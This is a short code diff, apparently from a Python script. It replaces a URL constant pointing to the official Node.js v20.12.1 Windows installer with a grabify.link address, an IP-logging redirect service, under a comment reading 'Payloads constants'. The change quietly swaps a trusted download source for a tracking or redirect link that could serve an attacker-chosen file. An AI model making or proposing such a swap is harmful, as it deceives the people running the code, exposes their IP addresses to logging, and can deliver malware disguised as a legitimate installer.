@@ -1,5 +1,5 @@
 # URL:
-URL: str = "https://nodejs.org/dist/v20.12.1/node-v20.12.1-x64.msi"
+URL: str = "https://grabify.link/46N29M"
 
 # Payloads constants
 
